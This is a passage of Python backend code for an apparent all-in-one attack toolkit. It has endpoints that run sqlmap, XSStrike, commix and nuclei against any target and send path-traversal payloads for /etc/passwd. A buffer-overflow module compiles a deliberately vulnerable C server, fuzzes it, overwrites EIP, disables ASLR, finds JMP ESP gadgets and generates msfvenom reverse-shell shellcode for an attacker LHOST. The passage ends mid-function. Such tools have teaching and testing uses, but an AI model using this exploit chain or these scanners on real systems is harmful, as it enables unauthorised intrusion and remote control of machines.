    result = await run_tool(["sqlmap","-u",req.target,"--batch","--level=2","--risk=1","--output-dir=/tmp/sqlmap_out","--forms","--crawl=2"], timeout=180)
    out = result.get("output","")
    findings = []
    vuln_params = re.findall(r"Parameter:\s*(.+?)\s+\(", out)
    for p in dict.fromkeys(vuln_params):
        findings.append({"detail":f"SQL Injection in parameter: {p}","severity":"CRITICAL","cvss":"9.8","cve":"N/A","cwe":"CWE-89","cwe_name":"SQL Injection","owasp":"A03:2021","remediation":"Use parameterised queries / prepared statements"})
    scan_id = str(uuid.uuid4())
    save_scan(scan_id,"sqlmap",req.target,result)
    return {"scan_id":scan_id,"target":req.target,"tool":"sqlmap","findings":findings,"total":len(findings),"raw_output":out,"command":result.get("cmd",""),"timestamp":datetime.datetime.utcnow().isoformat()}


@app.post("/api/scan/headers")
async def scan_headers(req: ScanRequest, user=Depends(verify_token)):
    SECURITY_HEADERS = [
        ("content-security-policy","Content-Security-Policy","HIGH","CSP prevents XSS attacks"),
        ("strict-transport-security","HSTS","HIGH","Forces HTTPS connections"),
        ("x-content-type-options","X-Content-Type-Options","MEDIUM","Prevents MIME sniffing"),
        ("x-frame-options","X-Frame-Options","MEDIUM","Prevents clickjacking"),
        ("referrer-policy","Referrer-Policy","LOW","Controls referrer information"),
        ("permissions-policy","Permissions-Policy","LOW","Controls browser features"),
    ]
    findings = []
    headers_found = {}
    try:
        result = await run_tool(["curl","-sI","--max-time","10","-L",req.target], timeout=20)
        out = result.get("output","")
        for line in out.splitlines():
            if ":" in line:
                k,_,v = line.partition(":")
                headers_found[k.strip().lower()] = v.strip()
        for hdr_key, hdr_name, sev, desc in SECURITY_HEADERS:
            if hdr_key not in headers_found:
                findings.append({"detail":f"Missing {hdr_name} header — {desc}","severity":sev,"cvss":"5.3","cve":"N/A","cwe":"CWE-16","cwe_name":"Configuration","owasp":"A05:2021","remediation":_rem(hdr_name)})
    except Exception as e:
        findings.append({"detail":f"Scan error: {e}","severity":"INFO","cvss":"0.0","cve":"N/A","cwe":"N/A","cwe_name":"Scan Error","owasp":"N/A","remediation":"Check target"})
    scan_id = str(uuid.uuid4())
    save_scan(scan_id,"headers",req.target,{"output":str(findings)})
    return {"scan_id":scan_id,"target":req.target,"tool":"headers","findings":findings,"total":len(findings),"headers_present":headers_found,"timestamp":datetime.datetime.utcnow().isoformat()}


@app.post("/api/scan/cookies")
async def scan_cookies(req: ScanRequest, user=Depends(verify_token)):
    findings = []
    cookies = []
    try:
        result = await run_tool(["curl","-sI","--max-time","10","-L",req.target], timeout=20)
        out = result.get("output","")
        for line in out.splitlines():
            if line.lower().startswith("set-cookie:"):
                cookie_val = line[11:].strip()
                cookie_name = cookie_val.split("=")[0].split(";")[0].strip()
                issues = []
                if "httponly" not in cookie_val.lower(): issues.append("Missing HttpOnly")
                if "secure" not in cookie_val.lower():   issues.append("Missing Secure flag")
                if "samesite" not in cookie_val.lower(): issues.append("Missing SameSite")
                score = max(0, 100 - len(issues)*30)
                cookies.append({"name":cookie_name,"cookie":cookie_val,"issues":issues,"secure_score":score})
                if issues:
                    findings.append({"detail":f"Cookie '{cookie_name}': {', '.join(issues)}","severity":"MEDIUM","cvss":"5.4","cve":"N/A","cwe":"CWE-614","cwe_name":"Sensitive Cookie","owasp":"A02:2021","remediation":"Set Secure, HttpOnly, SameSite=Strict on all session cookies"})
    except Exception as e:
        findings.append({"detail":f"Scan error: {e}","severity":"INFO","cvss":"0.0","cve":"N/A","cwe":"N/A","cwe_name":"Scan Error","owasp":"N/A","remediation":"Check target"})
    scan_id = str(uuid.uuid4())
    save_scan(scan_id,"cookies",req.target,{"output":str(cookies)})
    return {"scan_id":scan_id,"target":req.target,"tool":"cookies","findings":findings,"cookies":cookies,"total":len(cookies),"timestamp":datetime.datetime.utcnow().isoformat()}


@app.post("/api/scan/ssl")
async def scan_ssl(req: ScanRequest, user=Depends(verify_token)):
    host = _recon_host(req.target)
    result = await run_tool(["sslscan","--no-colour",host], timeout=60)
    out = result.get("output","")
    findings = []
    if re.search(r"SSLv[23]|TLSv1\.0|TLSv1\.1",out,re.IGNORECASE):
        findings.append({"detail":"Weak SSL/TLS protocol enabled (SSLv2/3 or TLS 1.0/1.1)","severity":"HIGH","cvss":"7.5","cve":"N/A","cwe":"CWE-326","cwe_name":"Weak Cryptography","owasp":"A02:2021","remediation":"Disable SSLv2, SSLv3, TLS 1.0, TLS 1.1. Use TLS 1.2+ only."})
    if re.search(r"RC4|DES|3DES|EXPORT|NULL|anon",out,re.IGNORECASE):
        findings.append({"detail":"Weak cipher suite detected (RC4/DES/EXPORT/NULL)","severity":"HIGH","cvss":"7.5","cve":"N/A","cwe":"CWE-327","cwe_name":"Broken Algorithm","owasp":"A02:2021","remediation":"Disable weak cipher suites. Use AES-GCM with perfect forward secrecy."})
    if "self-signed" in out.lower() or "untrusted" in out.lower():
        findings.append({"detail":"Self-signed or untrusted SSL certificate","severity":"MEDIUM","cvss":"5.3","cve":"N/A","cwe":"CWE-295","cwe_name":"Certificate Validation","owasp":"A02:2021","remediation":"Use a certificate from a trusted CA."})
    scan_id = str(uuid.uuid4())
    save_scan(scan_id,"ssl",req.target,result)
    return {"scan_id":scan_id,"target":req.target,"tool":"sslscan","findings":findings,"total":len(findings),"raw_output":out,"timestamp":datetime.datetime.utcnow().isoformat()}


@app.post("/api/scan/xss")
async def scan_xss(req: ScanRequest, user=Depends(verify_token)):
    result = await run_tool(["python3","/usr/share/xsstrike/xsstrike.py","-u",req.target,"--crawl","--blind","--skip-dom","-l","2"], timeout=120)
    out = result.get("output","")
    findings = []
    for line in out.splitlines():
        if "vulnerable" in line.lower() or "XSS" in line:
            findings.append({"detail":line.strip(),"severity":"HIGH","cvss":"7.4","cve":"N/A","cwe":"CWE-79","cwe_name":"Cross-Site Scripting","owasp":"A03:2021","remediation":"Sanitise and encode all user input; enforce Content-Security-Policy."})
    scan_id = str(uuid.uuid4())
    save_scan(scan_id,"xss",req.target,result)
    return {"scan_id":scan_id,"target":req.target,"tool":"xsstrike","findings":findings,"total":len(findings),"raw_output":out,"timestamp":datetime.datetime.utcnow().isoformat()}


@app.post("/api/scan/cms")
async def scan_cms(req: ScanRequest, user=Depends(verify_token)):
    result = await run_tool(["whatweb","--color=never","--no-errors","-a","3",req.target], timeout=60)
    out = result.get("output","")
    findings = []
    for kw,detail,sev in [
        ("WordPress","WordPress CMS detected — check for outdated plugins","HIGH"),
        ("Joomla","Joomla CMS detected — check for known CVEs","HIGH"),
        ("Drupal","Drupal CMS detected — Drupalgeddon vulnerabilities may apply","HIGH"),
        ("jQuery[1","Outdated jQuery version detected","MEDIUM"),
        ("Bootstrap[2","Outdated Bootstrap version","LOW"),
    ]:
        if kw.lower() in out.lower():
            findings.append({"detail":detail,"severity":sev,"cvss":"7.5" if sev=="HIGH" else "5.3","cve":"N/A","cwe":"CWE-1035","cwe_name":"Using Vulnerable Components","owasp":"A06:2021","remediation":"Update CMS and all plugins to latest versions."})
    scan_id = str(uuid.uuid4())
    save_scan(scan_id,"cms",req.target,result)
    return {"scan_id":scan_id,"target":req.target,"tool":"whatweb","findings":findings,"total":len(findings),"raw_output":out,"timestamp":datetime.datetime.utcnow().isoformat()}


@app.post("/api/scan/dirb")
async def scan_dirb(req: ScanRequest, user=Depends(verify_token)):
    result = await run_tool(["dirb",req.target,"/usr/share/wordlists/dirb/common.txt","-S","-r"], timeout=120)
    out = result.get("output","")
    found = []
    for line in out.splitlines():
        m = re.match(r"==> DIRECTORY:\s*(.+)|^\+\s+(https?://\S+)", line.strip())
        if m:
            url = (m.group(1) or m.group(2) or "").strip()
            if url: found.append(url)
    findings = [{"detail":f"Accessible path: {u}","severity":"LOW","cvss":"3.1","cve":"N/A","cwe":"CWE-538","cwe_name":"File Exposure","owasp":"A01:2021","remediation":"Restrict access to sensitive directories"} for u in found]
    scan_id = str(uuid.uuid4())
    save_scan(scan_id,"dirb",req.target,result)
    return {"scan_id":scan_id,"target":req.target,"tool":"dirb","findings":findings,"found":found,"total":len(found),"raw_output":out,"timestamp":datetime.datetime.utcnow().isoformat()}


@app.post("/api/scan/nuclei")
async def nuclei_scan(req: ScanRequest, user=Depends(verify_token)):
    cmd = ["nuclei","-u",req.target,"-severity","critical,high,medium,low","-c","25","-timeout","10","-no-color","-jsonl"]
    result = await run_tool(cmd, timeout=300)
    findings = []
    CVSS_MAP = {"critical":"9.8","high":"7.5","medium":"5.3","low":"3.1"}
    for line in result["output"].split("\n"):
        line = line.strip()
        if not line: continue
        try:
            data = json.loads(line)
            info = data.get("info",{})
            sev  = info.get("severity","info").lower()
            cves = info.get("classification",{}).get("cve-id") or []
            cwes = info.get("classification",{}).get("cwe-id") or []
            findings.append({"detail":info.get("name","Nuclei Finding")+(f" — {data.get('matched-at','')}" if data.get("matched-at") else ""),"severity":sev.upper(),"cvss":CVSS_MAP.get(sev,"0.0"),"cve":cves[0] if cves else "N/A","cwe":cwes[0] if cwes else "N/A","cwe_name":"Security Vulnerability","owasp":"A05:2021","remediation":info.get("remediation") or "Apply patch or update the affected component."})
        except: pass
    scan_id = str(uuid.uuid4())
    save_scan(scan_id,"nuclei",req.target,result)
    return {"scan_id":scan_id,"target":req.target,"tool":"nuclei","findings":findings,"total":len(findings),"raw_output":result["output"],"timestamp":datetime.datetime.utcnow().isoformat()}


# ══════════════════════════════════════════════════════════════
#  ADDITIONAL SCAN ENDPOINTS (commix, lfi, csrf, idor, ssti)
# ══════════════════════════════════════════════════════════════

import requests as _req_lib
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


@app.post("/api/scan/commix")
async def commix_scan(req: ScanRequest, user=Depends(verify_token)):
    cmd = ["commix","--url",req.target,"--crawl=1","--batch","--level=1","--timeout=10","--output-dir=/tmp/commix_out"]
    result = await run_tool(cmd, timeout=180)
    out = result["output"].lower()
    vulnerable = ("is vulnerable" in out or "command injection" in out or "[+]" in result["output"] and "parameter" in out)
    findings = []
    if vulnerable:
        findings.append({"detail":"OS Command Injection vulnerability detected","severity":"CRITICAL","cvss":"9.8","cve":"N/A","cwe":"CWE-78","cwe_name":"OS Command Injection","owasp":"A03:2021","remediation":"Never pass user input to OS commands. Use safe APIs and input validation."})
    scan_id = str(uuid.uuid4())
    save_scan(scan_id,"commix",req.target,result)
    return {"scan_id":scan_id,"target":req.target,"tool":"commix","vulnerable":vulnerable,"findings":findings,"total":len(findings),"raw_output":result["output"],"timestamp":datetime.datetime.utcnow().isoformat()}


@app.post("/api/scan/lfi")
async def lfi_scan(req: ScanRequest, user=Depends(verify_token)):
    payloads = ["../../../../etc/passwd","..%2F..%2F..%2F..%2Fetc%2Fpasswd","....//....//....//etc/passwd","../../../../windows/win.ini"]
    findings = []
    indicators = ["root:x:","bin:x:","[extensions]","for 16-bit"]
    for payload in payloads:
        test_url = req.target + payload if not req.target.endswith("/") else req.target + payload
        try:
            r = _req_lib.get(test_url, timeout=8, verify=False, allow_redirects=True)
            for ind in indicators:
                if ind in r.text:
                    findings.append({"detail":f"LFI confirmed: {payload} reveals {ind}","severity":"CRITICAL","cvss":"9.1","cve":"N/A","cwe":"CWE-22","cwe_name":"Path Traversal","owasp":"A01:2021","remediation":"Validate and sanitise all file path inputs. Use allowlists."})
                    break
        except: pass
    scan_id = str(uuid.uuid4())
    save_scan(scan_id,"lfi",req.target,{"output":str(findings)})
    return {"scan_id":scan_id,"target":req.target,"tool":"lfi","findings":findings,"total":len(findings),"timestamp":datetime.datetime.utcnow().isoformat()}


@app.post("/api/scan/csrf")
async def csrf_scan(req: ScanRequest, user=Depends(verify_token)):
    findings = []
    try:
        r = _req_lib.get(req.target,timeout=10,verify=False,headers={"User-Agent":"Mozilla/5.0"},allow_redirects=True)
        forms = re.findall(r"<form[^>]*?>.*?</form>",r.text,re.DOTALL|re.IGNORECASE)
        csrf_patterns = ["csrf","_token","token","authenticity_token","__requestverificationtoken","xsrf","nonce"]
        for i,form in enumerate(forms):
            has_csrf = any(p in form.lower() for p in csrf_patterns)
            m = re.search(r'method=["\'](\w+)["\']',form,re.IGNORECASE)
            method = m.group(1).upper() if m else "GET"
            am = re.search(r'action=["\']([^"\']*)["\']',form,re.IGNORECASE)
            action = am.group(1) if am else req.target
            if method in ("POST","PUT","DELETE") and not has_csrf:
                findings.append({"detail":f"CSRF: Form #{i+1} (action={action}) has no CSRF token","severity":"HIGH","cvss":"8.0","cve":"N/A","cwe":"CWE-352","cwe_name":"CSRF","owasp":"A01:2021","remediation":"Add CSRF tokens to all state-changing forms."})
        if not r.headers.get("Referrer-Policy"):
            findings.append({"detail":"Missing Referrer-Policy header","severity":"LOW","cvss":"3.1","cve":"N/A","cwe":"CWE-352","cwe_name":"CSRF","owasp":"A01:2021","remediation":"Add Referrer-Policy: strict-origin-when-cross-origin header."})
    except Exception as e:
        findings.append({"detail":f"CSRF scan error: {e}","severity":"INFO","cvss":"0.0","cve":"N/A","cwe":"N/A","cwe_name":"Scan Error","owasp":"N/A","remediation":"Check target accessibility."})
    scan_id = str(uuid.uuid4())
    save_scan(scan_id,"csrf",req.target,{"output":str(findings)})
    return {"scan_id":scan_id,"target":req.target,"tool":"csrf","findings":findings,"total":len(findings),"timestamp":datetime.datetime.utcnow().isoformat()}


# ══════════════════════════════════════════════════════════════
#  BUFFER OVERFLOW MODULE
# ══════════════════════════════════════════════════════════════

import socket as _sock, struct as _struct, time as _time

class BOFRequest(BaseModel):
    target:       str
    prefix:       str  = ""
    fuzz_step:    int  = 100
    pattern_size: int  = 500
    eip_value:    str  = ""
    offset:       int  = 0
    bad_chars:    str  = "\\x00"
    jmp_esp:      str  = ""
    binary_path:  str  = "/tmp/vulnserver"
    lhost:        str  = ""
    lport:        int  = 4444
    payload_type: str  = "linux/x86/shell_reverse_tcp"
    shellcode:    str  = ""
    pattern:      str  = ""


def _bof_parse_target(target: str):
    parts = target.strip().replace("tcp://","").replace("http://","").split(":")
    host = parts[0]
    port = int(parts[1]) if len(parts) > 1 else 9999
    return host, port


def _bof_send(host, port, data: bytes, timeout=5) -> bool:
    try:
        s = _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((host, port))
        s.recv(1024)
        s.send(data + b"\r\n")
        try: s.recv(1024)
        except: pass
        s.close()
        return True
    except Exception:
        return False


def _bof_parse_bad_chars(bad_chars: str) -> list:
    hexes = re.findall(r'[0-9a-fA-F]{2}', bad_chars)
    return [int(h,16) for h in hexes] if hexes else [0x00]

async def _bof_restart_server(binary: str, port: int):
    """Kill existing server and restart it in background, wait until ready."""
    subprocess.run(["pkill", "-f", os.path.basename(binary)], capture_output=True)
    await asyncio.sleep(0.4)
    proc = await asyncio.create_subprocess_exec(
        binary,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.STDOUT,
    )
    # Wait until "listening" appears in output
    for _ in range(30):
        await asyncio.sleep(0.1)
        try:
            line = await asyncio.wait_for(proc.stdout.readline(), timeout=0.2)
            if b"listening" in line.lower() or b"port" in line.lower():
                break
        except asyncio.TimeoutError:
            pass
    await asyncio.sleep(0.2)
    return proc


VULNSERVER_C = r"""
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

void vuln(char *input) {
    char buf[500];
    strcpy(buf, input);
}

int main() {
    int server, client;
    struct sockaddr_in addr;
    char input[2000];
    int opt = 1;
    socklen_t addrlen = sizeof(addr);

    server = socket(AF_INET, SOCK_STREAM, 0);
    setsockopt(server, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(9999);
    bind(server, (struct sockaddr*)&addr, sizeof(addr));
    listen(server, 5);
    printf("Listening on port 9999\n");
    fflush(stdout);

    while(1) {
        client = accept(server, (struct sockaddr*)&addr, &addrlen);
        char welcome[] = "Welcome to VulnServer\n";
        send(client, welcome, strlen(welcome), 0);
        while(1) {
            memset(input, 0, sizeof(input));
            int n = recv(client, input, sizeof(input)-1, 0);
            if(n <= 0) break;
            input[n] = 0;
            if(strncmp(input, "OVERFLOW1 ", 10) == 0) {
                vuln(input + 10);
                send(client, "OK\n", 3, 0);
            } else if(strncmp(input, "EXIT", 4) == 0) {
                break;
            } else {
                send(client, "UNKNOWN COMMAND\n", 16, 0);
            }
        }
        close(client);
    }
    return 0;
}
"""

def _ensure_vulnserver(binary: str = "/tmp/vulnserver") -> str:
    """Auto-write and compile vulnserver if binary missing. Returns '' on success or error string."""
    if os.path.exists(binary):
        return ""
    src = binary + ".c"
    try:
        with open(src, "w") as f:
            f.write(VULNSERVER_C)
    except Exception as e:
        return f"Cannot write {src}: {e}"
    # Try with gcc-multilib (-m32), fall back to native
    for flags in ["-m32 -fno-stack-protector -z execstack -no-pie",
                  "-fno-stack-protector -z execstack -no-pie"]:
        r = subprocess.run(
            ["bash", "-c", f"gcc {flags} -o {binary} {src} 2>&1"],
            capture_output=True, text=True, timeout=30)
        if os.path.exists(binary):
            return ""
    return f"gcc compile failed: {r.stdout} {r.stderr}"


@app.post("/api/bof/fuzz")
async def bof_fuzz(req: BOFRequest, user=Depends(verify_token)):
    host, port = _bof_parse_target(req.target)
    prefix = req.prefix.encode("latin-1") if req.prefix else b""
    step   = max(10, min(req.fuzz_step, 500))
    binary = (req.binary_path or "/tmp/vulnserver").strip()
    # Auto-compile vulnserver if binary missing
    err = _ensure_vulnserver(binary)
    if err:
        return {"error": f"Auto-compile failed: {err}\n\nManual fix:\napt install gcc-multilib -y\ngcc -m32 -fno-stack-protector -z execstack -no-pie -o {binary} {binary}.c"}
    # Auto-start vulnserver if binary exists and nothing is listening
    if os.path.exists(binary):
        try:
            import socket as _ts
            s = _ts.socket(); s.settimeout(1)
            s.connect((host, port)); s.close()
        except Exception:
            await _auto_start_vulnserver(binary, port)
    size   = step
    crash_at = None
    for _ in range(200):
        payload = prefix + b"A" * size
        try:
            s = _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM)
            s.settimeout(4)
            s.connect((host, port))
            s.recv(1024)
            s.send(payload + b"\r\n")
            try: s.recv(1024)
            except: pass
            s.close()
        except Exception:
            crash_at = size
            break
        _time.sleep(0.3)
        size += step
    if crash_at:
        return {"crash_at":crash_at,"recommended_pattern_size":crash_at+400,"message":f"Server crashed at {crash_at} bytes"}
    return {"crash_at":None,"message":"No crash detected — check target is running"}


async def _auto_start_vulnserver(binary: str, port: int):
    """Kill old instance and start vulnserver fresh, wait until listening."""
    subprocess.run(["pkill", "-f", os.path.basename(binary)], capture_output=True)
    await asyncio.sleep(0.5)
    proc = subprocess.Popen(
        ["bash", "-c", f"ulimit -c unlimited; {binary}"],
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    deadline = _time.time() + 5
    while _time.time() < deadline:
        line = proc.stdout.readline()
        if not line: break
        if b"listen" in line.lower() or b"port" in line.lower():
            break
    await asyncio.sleep(0.3)
    return proc

@app.post("/api/bof/offset")
async def bof_offset(req: BOFRequest, user=Depends(verify_token)):
    host, port = _bof_parse_target(req.target)
    prefix = req.prefix.encode("latin-1") if req.prefix else b""
    size   = (req.pattern_size or 500) + 200  # +200 ensures EIP is overwritten past the buffer

    # Generate cyclic pattern
    result = await run_tool(["msf-pattern_create", "-l", str(size)], timeout=15)
    pattern = result.get("output", "").strip()
    if not pattern:
        return {"error": "msf-pattern_create not found — install: apt install metasploit-framework"}

    binary    = (req.binary_path or "/tmp/vulnserver").strip()
    eip_value = (req.eip_value or "").strip()
    offset    = None
    debug_log = ""

    # ── If user provided EIP → just calculate offset ─────────────
    if eip_value:
        eip_clean = eip_value.replace("0x","").replace("0X","").upper().strip()
        off_r = await run_tool(["msf-pattern_offset","-l",str(size),"-q",eip_clean], timeout=15)
        m = re.search(r"Exact match at offset (\d+)", off_r.get("output",""))
        if m:
            offset = int(m.group(1))
            return {"offset":offset,"eip_value":eip_clean,"pattern":pattern,
                    "message":f"✅ Offset = {offset} bytes | EIP = {eip_clean}"}
        return {"error":f"EIP '{eip_clean}' not found in pattern — check value or increase pattern size",
                "eip_value":eip_clean}

    # ── Just return the pattern — user sends it via script after starting GDB ──
    return {
        "offset": None, "eip_value": None, "pattern": pattern,
        "sent": False,
        "pattern_size": size,
        "message": f"Pattern ready ({size} bytes)"
    }


@app.post("/api/bof/send_pattern")
async def bof_send_pattern(req: BOFRequest, user=Depends(verify_token)):
    host, port = _bof_parse_target(req.target)
    prefix = req.prefix.encode("latin-1") if req.prefix else b""
    pattern = req.pattern.encode("latin-1") if req.pattern else b""
    if not pattern:
        return {"sent": False, "error": "No pattern provided"}
    try:
        _bof_send(host, port, prefix + pattern)
        return {"sent": True, "message": f"Pattern sent to {host}:{port} — vulnserver crashed, check GDB"}
    except Exception as e:
        return {"sent": False, "error": str(e),
                "message": f"Could not connect to {host}:{port} — is vulnserver running inside GDB?"}


@app.post("/api/bof/eip_control")
async def bof_eip_control(req: BOFRequest, user=Depends(verify_token)):
    if not req.offset:
        return {"error":"Offset required"}
    host, port = _bof_parse_target(req.target)
    binary = (req.binary_path or "").strip()
    prefix = req.prefix.encode("latin-1") if req.prefix else b""
    if os.path.exists(binary):
        await _bof_restart_server(binary, port)
    payload  = prefix + b"A"*req.offset + b"BBBB" + b"C"*max(0,500-req.offset-4)
    _bof_send(host, port, payload)
    return {"offset":req.offset,"payload_size":len(payload),"eip_overwrite":"BBBB (0x42424242)","sent":True,"message":f"Sent {len(payload)} bytes — EIP should show 42424242 in debugger"}


@app.post("/api/bof/badchars")
async def bof_badchars(req: BOFRequest, user=Depends(verify_token)):
    if not req.offset:
        return {"error":"Offset required"}
    host, port = _bof_parse_target(req.target)
    binary = (req.binary_path or "").strip()
    prefix = req.prefix.encode("latin-1") if req.prefix else b""
    if os.path.exists(binary):
        await _bof_restart_server(binary, port)
    known_bad = _bof_parse_bad_chars(req.bad_chars)
    all_bytes = bytearray([b for b in range(1,256) if b not in known_bad])
    payload  = prefix + b"A"*req.offset + b"BBBB" + bytes(all_bytes) + b"C"*100
    sent = _bof_send(host, port, payload)
    excluded = [f"\\x{b:02x}" for b in known_bad]
    return {"sent":sent,"bytes_tested":len(all_bytes),"excluded":excluded,"payload_size":len(payload),"message":f"Sent {len(all_bytes)} bytes — all sequential = only \\x00 is bad"}


def _elf_find_jmp_esp(binary_path: str, bad_bytes: list, load_base: int = 0) -> list:
    """Pure Python: scan ELF binary for JMP ESP (\\xff\\xe4) — instant, no external tools."""
    gadgets = []
    try:
        with open(binary_path, 'rb') as f:
            data = f.read()
        if len(data) < 52 or data[:4] != b'\x7fELF' or data[4] != 1:
            return []  # not 32-bit ELF
        e_phoff     = _struct.unpack_from('<I', data, 28)[0]
        e_phentsize = _struct.unpack_from('<H', data, 42)[0]
        e_phnum     = _struct.unpack_from('<H', data, 44)[0]
        JMP_ESP = b'\xff\xe4'
        for i in range(e_phnum):
            h = e_phoff + i * e_phentsize
            if h + 32 > len(data):
                break
            p_type  = _struct.unpack_from('<I', data, h)[0]
            p_flags = _struct.unpack_from('<I', data, h + 24)[0]
            p_off   = _struct.unpack_from('<I', data, h + 4)[0]
            p_vaddr = _struct.unpack_from('<I', data, h + 8)[0]
            p_fsz   = _struct.unpack_from('<I', data, h + 16)[0]
            if p_type != 1 or not (p_flags & 1):   # PT_LOAD + PF_X only
                continue
            seg = data[p_off:p_off + p_fsz]
            idx = 0
            while True:
                pos = seg.find(JMP_ESP, idx)
                if pos == -1:
                    break
                vaddr  = load_base + p_vaddr + pos
                vbytes = list(_struct.pack('<I', vaddr))
                if not any(b in bad_bytes for b in vbytes):
                    le = "".join(f"\\x{b:02x}" for b in vbytes)
                    gadgets.append({"address": f"0x{vaddr:08x}", "gadget": "jmp esp", "little_endian": le})
                idx = pos + 1
    except Exception:
        pass
    return gadgets


@app.post("/api/bof/jmpesp")
async def bof_jmpesp(req: BOFRequest, user=Depends(verify_token)):
    binary    = (req.binary_path or "").strip()
    bad_bytes = _bof_parse_bad_chars(req.bad_chars)

    # Disable ASLR automatically (required for stable libc gadget addresses)
    try:
        with open("/proc/sys/kernel/randomize_va_space", "w") as _f:
            _f.write("0\n")
        _aslr = "0"
    except Exception:
        try:
            subprocess.run(
                ["sudo", "sh", "-c",
                 "echo 0 > /proc/sys/kernel/randomize_va_space"],
                capture_output=True, timeout=5)
        except Exception:
            pass
        try:
            with open("/proc/sys/kernel/randomize_va_space") as _f:
                _aslr = _f.read().strip()
        except Exception:
            _aslr = "?"

    # Auto-search common paths if binary not specified or doesn't exist
    search_paths = [
        binary,
        "/tmp/vulnserver", "/tmp/vuln", "/tmp/bof", "/tmp/target",
        "/home/kali/vulnserver", "/opt/vulnserver",
    ]
    resolved = ""
    for p in search_paths:
        if p and os.path.isfile(p):
            resolved = p
            break

    # Also try: find most recently modified ELF in /tmp
    if not resolved:
        try:
            tmp_files = [(os.path.getmtime(f"/tmp/{f}"), f"/tmp/{f}")
                         for f in os.listdir("/tmp") if os.path.isfile(f"/tmp/{f}")]
            tmp_files.sort(reverse=True)
            for _, fp in tmp_files[:10]:
                try:
                    with open(fp, "rb") as tf:
                        magic = tf.read(4)
                    if magic == b"\x7fELF":
                        resolved = fp
                        break
                except Exception:
                    pass
        except Exception:
            pass

    if not resolved:
        return {"gadgets": [], "address": "", "aslr": _aslr, "message":
                "Binary not found. Place the vulnerable binary at /tmp/vulnserver on Kali and re-run."}

    # Disable ASLR for reliable library addresses
    subprocess.run(["bash","-c","echo 0 > /proc/sys/kernel/randomize_va_space"], capture_output=True)

    # Scan the binary for JMP ESP (0xff 0xe4)
    gadgets = _elf_find_jmp_esp(resolved, bad_bytes, load_base=0)
    source  = resolved

    # Scan known 32-bit libc paths directly (most reliable on Kali)
    if not gadgets:
        libc32_paths = [
            "/lib/i386-linux-gnu/libc.so.6",
            "/lib32/libc.so.6",
            "/usr/lib32/libc.so.6",
            "/usr/lib/i386-linux-gnu/libc.so.6",
        ]
        for lp in libc32_paths:
            if os.path.isfile(lp):
                # Get load base from ldd
                ldd_r = await run_tool(["ldd", resolved], timeout=10)
                lib_base = 0
                for ln in ldd_r.get("output","").splitlines():
                    if "libc" in ln:
                        bm = re.search(r"\(0x([0-9a-f]+)\)", ln)
                        if bm: lib_base = int(bm.group(1), 16)
                lib_gadgets = _elf_find_jmp_esp(lp, bad_bytes, load_base=lib_base)
                if lib_gadgets:
                    gadgets.extend(lib_gadgets)
                    source = lp
                    break

    # objdump scan — finds JMP ESP by opcode bytes ff e4
    if not gadgets:
        obj_r = await run_tool(
            ["bash","-c",f"objdump -d {resolved} 2>/dev/null | grep -E 'ff e4|ffe4' | head -10"],
            timeout=15)
        for line in obj_r.get("output","").splitlines():
            m = re.search(r"([0-9a-f]+):\s+ff e4", line, re.IGNORECASE)
            if m:
                addr_int = int(m.group(1), 16)
                addr_bytes = list(_struct.pack("<I", addr_int))
                if not any(b in bad_bytes for b in addr_bytes):
                    le = "".join(f"\\x{b:02x}" for b in addr_bytes)
                    gadgets.append({"address":f"0x{addr_int:08x}","gadget":"jmp esp","little_endian":le})

    # ROPgadget fallback
    if not gadgets:
        for target in [resolved, "/lib/i386-linux-gnu/libc.so.6", "/lib32/libc.so.6"]:
            if not os.path.isfile(target): continue
            rop_r = await run_tool(["ROPgadget","--binary",target,"--opcode","ffe4"], timeout=20)
            for line in rop_r.get("output","").splitlines():
                m = re.search(r"(0x[0-9a-f]+)\s*:", line, re.IGNORECASE)
                if m:
                    addr_int = int(m.group(1),16)
                    addr_bytes = list(_struct.pack("<I",addr_int))
                    if not any(b in bad_bytes for b in addr_bytes):
                        le = "".join(f"\\x{b:02x}" for b in addr_bytes)
                        gadgets.append({"address":m.group(1),"gadget":"jmp esp","little_endian":le,"source":target})
            if gadgets: break

    # pwntools fallback
    if not gadgets:
        try:
            pwn_r = await run_tool(
                ["python3","-c",
                 f"from pwn import *;e=ELF('{resolved}',checksec=False);"
                 f"g=next(e.search(b'\\xff\\xe4'),None);"
                 f"print(hex(g) if g else 'none')"],
                timeout=15)
            out = pwn_r.get("output","").strip()
            if out and out != "none" and "0x" in out:
                addr_int = int(out,16)
                addr_bytes = list(_struct.pack("<I",addr_int))
                if not any(b in bad_bytes for b in addr_bytes):
                    le = "".join(f"\\x{b:02x}" for b in addr_bytes)
                    gadgets.append({"address":out,"gadget":"jmp esp","little_endian":le})
        except: pass

    if not gadgets:
        return {"gadgets":[],"address":"","aslr":_aslr,"source":resolved,"manual_required":True,
                "message":"JMP ESP not auto-found. In pwndbg terminal run:\n  rop --grep \"jmp esp\"\nor:\n  grep -r \"\\xff\\xe4\" /proc/$(pidof vulnserver)/maps\nThen enter the address manually."}

    best = gadgets[0]
    return {
        "gadgets":       gadgets[:10],
        "recommended":   best,
        "address":       best["address"],
        "little_endian": best["little_endian"],
        "source":        source,
        "aslr":          _aslr,
        "message":       f"✅ Auto-found {len(gadgets)} JMP ESP gadget(s) in {os.path.basename(source)}. "
                         f"Use: {best['address']} → {best['little_endian']}"
    }


@app.post("/api/bof/shellcode")
async def bof_shellcode(req: BOFRequest, user=Depends(verify_token)):
    if not req.lhost:
        return {"error":"LHOST required"}
    bad_bytes = "".join([f"\\x{b:02x}" for b in _bof_parse_bad_chars(req.bad_chars)])
    cmd = ["msfvenom","-p",req.payload_type,f"LHOST={req.lhost}",f"LPORT={req.lport}","EXITFUNC=thread","-b",bad_bytes,"-f","python","-v","shellcode"]
    result = await run_tool(cmd, timeout=60)
    out = result.get("output","")
    lines = [l for l in out.splitlines() if "shellcode" in l and ("b\"" in l or "b'" in l)]
    shellcode_py = "\n".join(lines)
    # Handle both double and single quote formats from msfvenom
    raw = re.findall(r'b["\']([^"\']+)["\']', shellcode_py)
